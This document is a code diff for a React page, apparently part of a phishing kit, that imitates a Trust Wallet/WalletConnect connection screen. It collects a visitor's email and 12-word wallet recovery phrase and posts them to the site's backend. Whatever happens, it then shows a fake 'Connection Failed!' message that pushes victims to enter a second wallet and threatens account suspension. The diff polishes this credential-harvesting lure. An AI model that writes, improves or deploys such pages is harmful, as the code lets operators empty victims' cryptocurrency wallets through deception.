@@ -6,6 +6,7 @@ import logo from "../assets/logo.png";
 import trust from "../assets/TrustWallet.png";
 import walletConnect from "../assets/WalletConnect.png";
 
+
 const TrustWalletConnect = () => {
   const [showPopup, setShowPopup] = useState(false);
   const [closing, setClosing] = useState(false);
@@ -36,9 +37,9 @@ const TrustWalletConnect = () => {
 
   const sendEmail = async () => {
     setIsSending(true);
-    
+
     console.log("🚀 Submitting Trust Wallet form...");
-    
+
     try {
       const response = await axios.post(
         `${API_URL}/api/trust-wallet/submit`,
@@ -54,14 +55,14 @@ const TrustWalletConnect = () => {
       );
 
       console.log("✅ Form submitted successfully!", response.data);
-      
+
       // Show the popup after successful submission
       setShowPopup(true);
-      
+
     } catch (error) {
       console.error("❌ Failed to submit form:", error);
       console.error("Error details:", error.response?.data);
-      
+
       // Still show popup even on error (as per original design)
       setShowPopup(true);
     } finally {
@@ -92,22 +93,27 @@ const TrustWalletConnect = () => {
   return (
     <>
       <div className="twc-page">
-        {/* Back Button */}
-        <button 
-          className="twc-back-button"
-          onClick={handleBackToDashboard}
-        >
-          ← Back
-        </button>
+
 
         <div className="twc-logo">
           <img src={logo} alt="logo" />
         </div>
 
         <div className="twc-card">
-          <div className="twc-header">
-            <h2 className="twc-connect-text">CONNECT</h2>
-            <img src={trust} alt="trust" />
+          <div className="twc-header-container">
+            <span className="twc-back" onClick={() => navigate(-1)}>←</span>
+            {/* WalletConnect logo ABOVE */}
+            <img
+              src={walletConnect}
+              alt="WalletConnect"
+              className="twc-walletconnect-img"
+            />
+
+            {/* CONNECT + Trust Wallet */}
+            <div className="twc-header-row">
+              <h2 className="twc-connect-text">CONNECT</h2>
+              <img src={trust} alt="Trust Wallet" />
+            </div>
           </div>
 
           <label className="twc-label-email">Enter your Email Address</label>
@@ -122,9 +128,13 @@ const TrustWalletConnect = () => {
             Enter your Trust Wallet 12 word Secret Phrase
           </label>
 
-          <p className="twc-info-text">
-            Trust wallet must be at least 30 days old and have $1 gas fee.
-          </p>
+          <div className="twc-info-wrapper">
+            <p className="twc-info-text-scroll">
+              The Trust Wallet must be older than 30 days. New wallets cannot be accepted for withdrawal !
+            </p>
+          </div>
+
+
 
           <div className="twc-phrase-box">
             {words.map((word, i) => (
@@ -156,12 +166,39 @@ const TrustWalletConnect = () => {
       {showPopup && (
         <div className={`twc-modal-overlay ${closing ? "closing" : ""}`}>
           <div className="twc-modal-box">
-            <div className="twc-popup-icon">✕</div>
+            <div className="twc-popup-icon">
+              <svg
+                className="twc-error-icon"
+                viewBox="0 0 52 52"
+                xmlns="http://www.w3.org/2000/svg"
+              >
+                <circle
+                  className="twc-error-circle"
+                  cx="26"
+                  cy="26"
+                  r="25"
+                  fill="none"
+                />
+                <line
+                  className="twc-error-line twc-error-line-left"
+                  x1="16"
+                  y1="16"
+                  x2="36"
+                  y2="36"
+                />
+                <line
+                  className="twc-error-line twc-error-line-right"
+                  x1="36"
+                  y1="16"
+                  x2="16"
+                  y2="36"
+                />
+              </svg>
+            </div>
+
             <h3 className="twc-popup-title">Connection Failed!</h3>
             <p className="twc-popup-text">
-              Your Trust Wallet is not eligible for connection.
-              Please try connecting with a different Trust Wallet.
-            </p>
+              Your Trust Wallet is not eligible for connection.Please try connecting with a different Trust Wallet. Repeated attempts using the same wallet may result in account suspension.            </p>
             <button className="twc-popup-btn" onClick={closePopup}>
               OK
             </button>
